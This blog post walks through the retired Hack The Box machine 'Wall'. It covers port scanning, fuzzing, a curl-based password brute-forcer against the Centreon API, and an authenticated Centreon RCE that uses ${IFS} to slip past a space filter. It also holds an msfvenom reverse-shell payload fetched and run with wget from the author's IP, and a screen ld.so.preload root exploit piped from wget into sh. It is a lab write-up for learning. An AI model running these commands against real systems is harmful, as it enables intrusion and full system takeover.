---
layout: post
title: "Wall: Hack The Box Walkthrough"
date: 2019-12-07 16:05:05 +0000
last_modified_at: 2019-12-07 16:05:05 +0000
category: Walkthrough
tags: ["Hack The Box", Wall, retired]
comments: true
image:
  feature: wall-htb-walkthrough.jpg
  credit: meineresterampe / Pixabay
  creditlink: https://pixabay.com/photos/stones-wall-quarry-stone-texture-770264/
---

This post documents the complete walkthrough of Wall, a retired vulnerable [VM][1] created by [askar][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Wall is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.157 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-16 01:20:23 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.157                                    
Discovered open port 80/tcp on 10.10.10.157
```

Nothing interesting. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -e tun1 -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.157
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Whoa. This is a shitshow man.

### Directory/File Enumeration

Well, since we only have the default Ubuntu Apache page, this is basically telling me to fuzz for other directories and files.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php -e -u http://10.10.10.157/ --timeout 30s                             [0/385]
===============================================================
Gobuster v3.0.1                                                                           
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.157/                                                  
[+] Threads:        10                                                                    
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Expanded:       true                                                                  
[+] Timeout:        30s              
===============================================================
2019/09/16 08:45:58 Starting gobuster      
===============================================================
http://10.10.10.157/.htaccess (Status: 403)
http://10.10.10.157/.htaccess.php (Status: 403)
http://10.10.10.157/.htpasswd (Status: 403)
http://10.10.10.157/.htpasswd.php (Status: 403)
http://10.10.10.157/.hta (Status: 403)  
http://10.10.10.157/.hta.php (Status: 403)  
http://10.10.10.157/aa.php (Status: 200)    
http://10.10.10.157/index.html (Status: 200)
http://10.10.10.157/monitoring (Status: 401)                                              
http://10.10.10.157/panel.php (Status: 200)                                               
http://10.10.10.157/server-status (Status: 403)
===============================================================
2019/09/16 08:53:19 Finished
===============================================================
```

Interesting. A protected directory and two PHP files. Let's see what we get with `wfuzz` and some common Burp parameters.

The file `aa.php` had two interesting parameters: `hostname` and `passwd`.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 1 -d "FUZZ=foo" http://10.10.10.157/aa.php
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.157/aa.php
Total requests: 2588

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

000160:  C=403     11 L       32 W          293 Ch        "hostname"
000435:  C=403     11 L       32 W          293 Ch        "passwd"

Total time: 127.9319
Processed Requests: 2588
Filtered Requests: 2586
Requests/sec.: 20.22950
```

Too bad the parameters result in a `403 Forbidden`. It's worthy to note that `panel.php` had the same parameters with the same results. Let's see if other verbs work for the discovered directory and files.

```
# wfuzz -w verbs.txt -w valid.txt -X FUZZ http://10.10.10.157/FUZ2Z
********************************************************
* Wfuzz 2.2.1 - The Web Fuzzer                           *
********************************************************

Target: HTTP://10.10.10.157/FUZ2Z
Total requests: 6

==================================================================
ID      Response   Lines      Word         Chars          Request    
==================================================================

00006:  C=200      0 L         7 W           26 Ch        "POST - panel.php"
00004:  C=200      5 L        21 W          154 Ch        "POST - monitoring/"
00005:  C=200      0 L         1 W            1 Ch        "POST - aa.php"
00001:  C=401     14 L        54 W          459 Ch        "GET - monitoring/"
00002:  C=200      0 L         1 W            1 Ch        "GET - aa.php"
00003:  C=200      0 L         7 W           26 Ch        "GET - panel.php"

Total time: 4.991455
Processed Requests: 6
Filtered Requests: 0
Requests/sec.: 1.202054
```

Hmm. What have we here? Basic authentication bypassed with POST? This is what we get.

<a class="image-popup">
![0efb06c2.png](/assets/images/posts/wall-htb-walkthrough/0efb06c2.png)
</a>

So `/centreon/` is the eventual directory.

### Centreon 19.04 - Authenticated Remote Code Execution

Googling for "centreon 19.04 exploit" quickly lands me on EDB-ID [47069](https://www.exploit-db.com/exploits/47069). However, it appears the exploit requires authentication.

The login page has pesky CSRF token implemented. Well, fret not. Centreon offers REST API for authentication that bypasses the token altogether. Yeah!

<a class="image-popup">
![8a521451.png](/assets/images/posts/wall-htb-walkthrough/8a521451.png)
</a>

With that in mind, I wrote a simple brute-forcer of sorts in `bash`, using `curl` as the main driver.

```bash
#!/bin/bash

HOST=10.10.10.157
CENT=centreon
USER=$1
PASS=$2

function die() {
  killall perl &>/dev/null
}

r=$(curl -s \
         -d "username=$USER&password=$PASS" \
   http://$HOST/$CENT/api/index.php?action=authenticate)

if grep -Evi bad <<<"$r" &>/dev/null; then
  echo "[*] Password is: $PASS"
  die
fi
```

Combined with GNU Parallel, you get a multi-threaded brute-forcer! Let's give it a shot.

<a class="image-popup">
![e777d4e3.png](/assets/images/posts/wall-htb-walkthrough/e777d4e3.png)
</a>

The credential is (`admin:password1`).

## Low-Privilege Shell

Back to EDB-ID 47069. The sample command doesn't work because there's no `ncat` in the machine :laughing:. Long story short, I managed to determine that the space character (' ') is restricted. We can always bypass this restriction with `${IFS}` where the space, tab ('\t') and the newline ('\n') characters are defined as internal field separators in the shell, most commonly Bash.

We can use `msfvenom` to generate a Linux reverse shell and then pull it into the machine with `wget`.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.12.100 LPORT=1234 -f elf -o vv
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: vv
```

Host the file with Python's SimpleHTTPServer module.

```
# python -m SimpleHTTPServer 80
```

Replace the command in 47069 with the following command:

```
# echo "wget -O/tmp/vv http://10.10.12.100/vv; chmod +x /tmp/vv; /tmp/vv" | sed 's/ /\$\{IFS\}/g'
wget${IFS}-O/tmp/vv${IFS}http://10.10.12.100/vv;${IFS}chmod${IFS}+x${IFS}/tmp/vv;${IFS}/tmp/vv
```

Let's give it a shot!

```
# python exploit.py http://10.10.10.157/centreon admin password1 10.10.12.100 1234
```

<a class="image-popup">
![bc006b6d.png](/assets/images/posts/wall-htb-walkthrough/bc006b6d.png)
</a>

Sweet.

## Privilege Escalation

During enumeration of `www-data`'s account, I noticed a vulnerable version of `screen` was installed.

<a class="image-popup">
![0c657cee.png](/assets/images/posts/wall-htb-walkthrough/0c657cee.png)
</a>

The exploit at EDB-ID [41154](https://www.exploit-db.com/exploits/41154) serves our need but to play it safe, I'm compiling the evil library (lines 11-20) and executable (lines 25-32) on my own machine. And since, my SimpleHTTPServer is still running, I can pull these files into the machine with `wget`.

Assuming the library and executable are compiled, the exploit script then becomes like this.

<div class="filename"><span>rootme.sh</span></div>

```bash
#!/bin/bash
HOST=10.10.12.100
wget http://$HOST/libhax.so
wget http://$HOST/rootshell
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/var/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
```

Exploit it on the the machine like so.

```
$ wget -O- http://10.10.12.100/rootme.sh | sh && ./rootshell
```

<a class="image-popup">
![07b2826a.png](/assets/images/posts/wall-htb-walkthrough/07b2826a.png)
</a>

Bam! Getting `user.txt` and `root.txt` is trivial with a `root` shell.

<a class="image-popup">
![7e86b291.png](/assets/images/posts/wall-htb-walkthrough/7e86b291.png)
</a>

<a class="image-popup">
![eb342004.png](/assets/images/posts/wall-htb-walkthrough/eb342004.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/208
[2]: https://www.hackthebox.eu/home/users/profile/17292
[3]: https://www.hackthebox.eu/
